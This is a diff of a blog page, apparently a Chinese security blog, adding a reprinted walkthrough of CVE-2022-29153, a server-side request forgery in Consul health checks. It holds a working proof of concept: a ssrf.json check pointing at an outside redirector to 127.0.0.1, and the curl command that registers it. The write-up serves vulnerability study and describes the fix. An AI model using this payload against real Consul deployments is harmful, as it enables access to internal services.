@@ -86,6 +86,74 @@
 
     
         <h2 class="title">
+            <a href="/2024/01/29/CVE-2022-29153-Consul/">
+                CVE-2022-29153 consul SSRF
+            </a>
+        </h2>
+    
+    <time>
+        Jan 29, 2024
+    </time>
+    <section class="content">
+        <h1><span id="cve-2022-29153-consul-ssrf">CVE-2022-29153 consul SSRF</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://github.com/cokeBeer/go-cves/blob/main/CVE-2022-29153/CVE-2022-29153.md">cokeBeer</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞信息">漏洞信息</span></h2><blockquote>
+<ul>
+<li>漏洞类型：SSRF</li>
+<li>漏洞版本：&lt; 1.9.17，&gt;&#x3D; 1.10.0, &lt; 1.10.10，&gt;&#x3D; 1.11.0, &lt; 1.11.5</li>
+<li>漏洞简介：http类型的health_check被重定向导致的SSRF</li>
+</ul>
+</blockquote>
+<h2><span id="repo介绍">repo介绍</span></h2><blockquote>
+<p>consul是一个用go语言编写的分布式应用管理服务器，目前在github上已经有24.7k个star</p>
+</blockquote>
+<h2><span id="漏洞分析">漏洞分析</span></h2><blockquote>
+<p>consul提供了对于服务的health_check能力。首先安装一个漏洞版本的consul</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://apt.releases.hashicorp.com/gpg | sudo apt-key add -</span><br><span class="line">sudo apt-add-repository <span class="string">&quot;deb [arch=amd64] https://apt.releases.hashicorp.com <span class="subst">$(lsb_release -cs)</span> main&quot;</span></span><br><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install consul=1.10.9</span><br></pre></td></tr></table></figure>
+
+<p>然后启动一个consul服务器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consul agent -dev -enable-script-checks -node=web -ui</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://localhost:8500/</code>可以看到consul的界面</p>
+<p><img src="/2024/01/29/CVE-2022-29153-Consul/1.png" alt="image"></p>
+<p>编写一个<code>ssrf.json</code>作为poc，里面标志的http地址会将请求302重定向到<code>127.0.0.1:80</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;ID&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ssrf&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ssrf&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">5001</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;check&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;checkid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ssrf_check&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Check ssrf&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://fuzz.red/ssrf/127.0.0.1/&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;interval&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10s&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeout&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1s&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用如下指令将<code>health_check</code>注册到consul服务器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --request PUT --data @ssrf.json http://127.0.0.1:8500/v1/agent/service/register</span><br></pre></td></tr></table></figure>
+
+<p>可以看到添加成功</p>
+<p><img src="/2024/01/29/CVE-2022-29153-Consul/2.png" alt="image"></p>
+<p>这时consul会主动运行<code>health_check</code>，请求被302重定向到内网，导致了SSRF。可以看到nc也收到了请求</p>
+<p><img src="/2024/01/29/CVE-2022-29153-Consul/3.png" alt="image"></p>
+</blockquote>
+<h2><span id="修复方式">修复方式</span></h2><blockquote>
+<p>在<a target="_blank" rel="noopener" href="https://github.com/hashicorp/consul/blob/928fefd2a7ee5ae8d90377514ec2022ee9730be0/agent/config/config.go#L391">agent&#x2F;config.go</a>中添<code>加DisableRedirects</code>字段，可以在服务器端配置，关闭<code>health_check</code>的重定向</p>
+<p><img src="/2024/01/29/CVE-2022-29153-Consul/4.png" alt="image"></p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-q6h7-4qgw-2j9p">https://github.com/advisories/GHSA-q6h7-4qgw-2j9p</a></li>
+</ul>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Consul/" rel="tag">Consul</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSRF/" rel="tag">SSRF</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2024/01/19/CVE-2020-13379-Grafana/">
                 挖洞经验 | Grafana应用实例未授权读取型SSRF（CVE-2020-13379）
             </a>
